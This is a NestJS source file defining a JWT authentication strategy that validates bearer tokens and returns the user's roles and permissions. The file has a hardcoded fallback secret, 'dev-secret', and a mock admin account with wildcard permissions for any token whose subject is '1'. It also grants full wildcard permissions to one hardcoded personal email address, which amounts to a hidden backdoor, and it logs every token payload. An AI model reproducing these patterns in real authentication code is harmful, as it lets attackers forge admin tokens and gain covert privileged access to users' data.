import { ExtractJwt, Strategy } from 'passport-jwt';
import { PassportStrategy } from '@nestjs/passport';
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { UsersService } from '../../iam/users/users.service';
import { AuthenticatedUser } from '../../common/types/authenticated-user.interface';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(private usersService: UsersService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: false,
      secretOrKey: process.env.JWT_SECRET || 'dev-secret',
    });
  }

  async validate(payload: any): Promise<AuthenticatedUser> {
    console.log('JwtStrategy.validate payload:', payload);
    const userId = payload.sub;
    
    // Mock user for development without DB seed
    if (userId === "1") {
      return {
        userId: "1",
        organizationId: "1",
        email: "admin@mybusiness.com",
        firstName: "System",
        lastName: "Admin",
        roleIds: ["admin"],
        permissions: ["*"],
      };
    }

    const user = await this.usersService.findById(userId);
    
    if (!user || !user.isActive) {
      throw new UnauthorizedException();
    }

    const { roleIds, permissions } = await this.usersService.getEffectivePermissions(userId);

    // This constitutes the trusted server-side context
    return {
      userId: user.id,
      organizationId: user.organizationId,
      email: user.email,
      firstName: user.firstName,
      lastName: user.lastName,
      roleIds,
      permissions: user.email === 'naimur582582@gmail.com' ? ['*'] : permissions,
    };
  }
}
